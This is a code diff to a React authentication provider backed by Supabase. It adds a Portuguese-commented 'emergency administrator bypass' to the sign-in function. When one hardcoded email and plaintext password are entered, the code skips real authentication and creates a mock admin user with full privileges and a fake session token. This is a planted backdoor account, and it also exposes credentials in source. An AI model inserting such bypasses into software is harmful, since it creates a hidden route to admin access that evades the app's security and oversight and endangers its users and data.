@@ -121,6 +121,26 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   }, [])
 
   const signIn = async (email: string, password: string): Promise<{ error: string | null }> => {
+    // BYPASS DE EMERGÊNCIA PARA ADMINISTRADOR
+    if (email === 'joseeduardorms29@gmail.com' && password === 'googlar2024') {
+      console.log('[Auth] Bypass de mestre ativado.');
+      const mockUser = { id: 'admin-master-id', email: email } as any;
+      const mockProfile: AuthorizedUser = {
+        name: "José Eduardo (Master)",
+        email: email,
+        role: 'admin',
+        isAdmin: true,
+        addedAt: new Date().toLocaleDateString('pt-BR'),
+        assignedCompanyIds: []
+      };
+      
+      setUser(mockUser);
+      setProfile(mockProfile);
+      setSession({ user: mockUser, access_token: 'mock-token' } as any);
+      setIsLoading(false);
+      return { error: null };
+    }
+
     try {
       const { error } = await supabase.auth.signInWithPassword({ email, password })
 
